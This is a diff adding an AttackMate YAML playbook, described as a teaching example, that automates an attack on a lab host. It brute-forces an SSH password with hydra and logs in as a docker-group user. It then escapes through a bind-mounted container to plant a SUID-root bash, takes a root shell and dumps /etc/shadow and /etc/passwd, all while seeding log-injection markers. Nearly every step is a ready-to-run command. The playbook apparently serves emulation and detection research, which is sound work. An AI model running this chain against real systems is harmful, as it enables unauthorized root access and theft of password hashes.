@@ -1,0 +1,296 @@
+#
+# Author: AttackMate Privilege-Escalation experiment (MIRANDA teaching example)
+# Description:
+#     Docker-group privilege escalation plus credential access. hydra brute-forces
+#     boba_fett (a non-sudo, docker-group account); we log in and confirm the docker
+#     membership, then abuse it: bind-mount the host / into a throwaway container, drop
+#     a SUID-root /bin/bash on the host and enter it (euid=0), then dump /etc/shadow +
+#     /etc/passwd. Only the staged SUID bash is cleaned up.
+#
+#     Tactic flow: Credential Access -> Initial Access -> Discovery -> Privilege Escalation -> Credential Access
+#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
+#
+# AUTHORIZED USE ONLY:
+#     Run this only against systems you own or have explicit written permission to test.
+#
+vars:
+  TARGET: 172.28.128.3
+  BRUTE_USER: boba_fett
+  PASSWDLIST: ~/tmp/passwd          # pre-existing wordlist on the op host (must contain mandalorian1)
+  # Log-injection marker. Space-free single token: auditd hex-encodes any argv that contains
+  # a space, which would break the marker join across the access.log / auth.log / auditd layers.
+  INJECTION: "this_is_the_injection"
+
+commands:
+
+  # ===================== Phase A: operator-side prep =====================
+
+  - type: shell
+    cmd: "mkdir -p /tmp/pe_docker"
+    metadata:
+      description: "Stage a local directory on the operator host to collect proof/output"
+
+  # ===================== Phase 0: pre-exploit log poisoning =====================
+  - type: http-client
+    cmd: GET
+    url: http://$TARGET/?probe=1
+    useragent: "$INJECTION"
+    exit_on_error: False
+    metadata:
+      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
+      techniques: "T1562.006"
+      tactics: "Defense Evasion"
+
+  - type: sleep
+    seconds: 4
+    min_sec: 1
+    random: True
+    metadata:
+      description: "Human-paced jitter between the two probes"
+
+  - type: ssh
+    cmd: id
+    username: "$INJECTION"
+    password: "x"
+    hostname: $TARGET
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
+      techniques: "T1110.001,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  # ===================== Phase 1: Credential Access (SSH brute force) =====================
+
+  # Brute-force the SSH password for BRUTE_USER with hydra, using the op host's wordlist.
+  - type: shell
+    cmd: hydra -l $BRUTE_USER -P $PASSWDLIST ssh://$TARGET
+    metadata:
+      description: "Brute-force the SSH password with hydra"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  # Pre-seed CRACKED so a no-match (hydra failed to crack) is obvious downstream instead of
+  # silently substituting a literal "$CRACKED".
+  - type: setvar
+    variable: CRACKED
+    cmd: "PARSE_FAILED"
+    metadata:
+      description: "Pre-seed the cracked-password variable so a parse failure is detectable"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  # Parse the cracked password into $CRACKED. mode: findall (NOT search) so the capture group
+  # is returned - mode: search returns the WHOLE matched line, not the group.
+  - type: regex
+    input: RESULT_STDOUT
+    cmd: "login:\\s+$BRUTE_USER\\s+password:\\s+(\\S+)"
+    mode: findall
+    output:
+      CRACKED: "$MATCH_0"
+    metadata:
+      description: "Parse the cracked SSH password from the hydra output"
+      techniques: "T1110.001"
+      tactics: "Credential Access"
+
+  - type: debug
+    cmd: "Cracked SSH password for $BRUTE_USER: $CRACKED"
+    metadata:
+      description: "Print the cracked credential (PARSE_FAILED means hydra did not crack it)"
+
+  # Log in with the cracked credential and open the reused foothold session; the proof `id`
+  # is wrapped so its execve also carries the marker.
+  - type: ssh
+    cmd: "bash -c 'id' \"$INJECTION\""
+    username: $BRUTE_USER
+    password: "$CRACKED"
+    hostname: $TARGET
+    interactive: False
+    creates_session: "foothold"
+    metadata:
+      description: "Log in over SSH using the brute-forced password (docker-group user); execve poisoned with the marker"
+      techniques: "T1078.003,T1021.004,T1033,T1562.006"
+      tactics: "Initial Access,Lateral Movement,Discovery,Defense Evasion"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before enumeration (human pacing)"
+
+  # ===================== Phase 2: Discovery / enumeration =====================
+  # Non-interactive over the foothold (still unprivileged), one wrapped command per step so
+  # each lands as its own auditd execve record with the marker as the trailing argv.
+
+  - type: ssh
+    cmd: "bash -c 'id' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/pe_docker/disc_01_id.txt
+    metadata:
+      description: "Current identity/groups (expect non-root boba_fett, docker group); execve poisoned with the marker"
+      techniques: "T1033,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -c 'uname -a' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/pe_docker/disc_02_uname.txt
+    metadata:
+      description: "Kernel name/version/arch; execve poisoned with the marker"
+      techniques: "T1082,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  # Group enumeration: CONFIRMS boba_fett is in the `docker` group (gates the PE) and shows the
+  # full docker roster (boba_fett, jabba_hutt, greedo, chewbacca) for later targeting.
+  - type: ssh
+    cmd: "bash -c 'cat /etc/group' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/pe_docker/disc_03_group.txt
+    metadata:
+      description: "Local groups and members (confirm docker membership); execve poisoned with the marker"
+      techniques: "T1069.001,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[docker_privesc] /etc/group (confirm boba_fett in docker) -> $RESULT_STDOUT"
+    metadata:
+      description: "Surface the group roster inline (must show boba_fett in the docker group)"
+      techniques: "T1069.001"
+      tactics: "Discovery"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 7
+    random: True
+    metadata:
+      description: "Operator-side think time before privilege escalation (human pacing)"
+
+  # ===================== Phase 3: Privilege Escalation (docker group -> host escape) =====================
+
+  # Confirm Docker is reachable as this user (no sudo) and enumerate available images.
+  # The escape reuses an existing image, so we need at least one to be present.
+  - type: ssh
+    cmd: "bash -c 'docker images' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/pe_docker/disc_04_images.txt
+    metadata:
+      description: "List Docker images reachable via the docker group; execve poisoned with the marker"
+      techniques: "T1613,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[docker_privesc] docker images -> $RESULT_STDOUT"
+    metadata:
+      description: "Surface available images (escape needs at least one)"
+      techniques: "T1613"
+      tactics: "Discovery"
+
+  # Escape: run a throwaway container with host / bind-mounted at /mnt. Inside the container we
+  # are root, so chroot into the host and write a SUID-root copy of the host's /bin/bash to
+  # /tmp/rootbash. We pin the plain `ubuntu` image and force --entrypoint chroot so the escape
+  # works regardless of an image's own ENTRYPOINT. Left UNWRAPPED (inner single quotes).
+  - type: ssh
+    cmd: 'docker run --rm --entrypoint chroot -v /:/mnt ubuntu /mnt sh -c ''cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'''
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "Bind-mount host / into a container and drop a SUID root bash on the host"
+      techniques: "T1610,T1611,T1548.001"
+      tactics: "Execution,Privilege Escalation"
+
+  # Enter the SUID root bash (-p keeps the elevated euid). Wait for the '#' prompt. Left
+  # UNWRAPPED so the prompt wait works. The session stays interactive/root from here on.
+  # If the spawned prompt differs, adjust the `prompts:` list after the first live run.
+  - type: ssh
+    cmd: "/tmp/rootbash -p\n"
+    session: "foothold"
+    interactive: True
+    command_timeout: 0
+    exit_on_error: False
+    metadata:
+      description: "Enter the SUID root bash to obtain a euid=0 shell"
+      techniques: "T1548.001"
+      tactics: "Privilege Escalation"
+
+  # Proof: runs inside the euid=0 shell. `bash -p -c` preserves the SUID euid=0 while carrying
+  # the marker (a plain `bash -c` would reset euid back to boba_fett).
+  - type: ssh
+    cmd: "bash -p -c 'id' \"$INJECTION\"\n"
+    session: "foothold"
+    interactive: True
+    exit_on_error: False
+    save: /tmp/pe_docker/pe_01_root_id.txt
+    metadata:
+      description: "Confirm root (expect euid=0); execve poisoned with the injection marker"
+      techniques: "T1033,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[docker_privesc] post-escape id (expect euid=0) -> $RESULT_STDOUT"
+    metadata:
+      description: "Surface the root identity inline"
+      techniques: "T1033"
+      tactics: "Discovery"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before credential access (human pacing)"
+
+  # ===================== Phase 4: Credential Access (root) =====================
+  # Still euid=0/interactive. `bash -p -c` so each dump runs as root and carries the marker.
+
+  - type: ssh
+    cmd: "bash -p -c 'cat /etc/shadow' \"$INJECTION\"\n"
+    session: "foothold"
+    interactive: True
+    exit_on_error: False
+    save: /tmp/pe_docker/ca_01_shadow.txt
+    metadata:
+      description: "Dump /etc/shadow password hashes; execve poisoned with the injection marker"
+      techniques: "T1003.008,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  - type: ssh
+    cmd: "bash -p -c 'cat /etc/passwd' \"$INJECTION\"\n"
+    session: "foothold"
+    interactive: True
+    exit_on_error: False
+    save: /tmp/pe_docker/ca_02_passwd.txt
+    metadata:
+      description: "Dump /etc/passwd account inventory; execve poisoned with the injection marker"
+      techniques: "T1003.008,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  # ===================== Phase 5: Cleanup (tooling only) =====================
+
+  # Remove the staged SUID root bash. `bash -p -c` so the removal runs as euid=0 (a plain
+  # bash -c would drop to boba_fett -> "Operation not permitted") and carries the marker.
+  - type: ssh
+    cmd: "bash -p -c 'rm -f /tmp/rootbash' \"$INJECTION\"\n"
+    session: "foothold"
+    interactive: True
+    exit_on_error: False
+    metadata:
+      description: "Remove the staged SUID root bash; execve poisoned with the injection marker"
+      techniques: "T1070.004,T1562.006"
+      tactics: "Defense Evasion"
+
+  - type: debug
+    cmd: "[docker_privesc] complete -> proof under /tmp/pe_docker/ (disc_0*, pe_01_root_id, ca_01_shadow, ca_02_passwd)"
+    metadata:
+      description: "Summary of where the trace's proof landed"
+      techniques: "T1003.008"
+      tactics: "Credential Access"
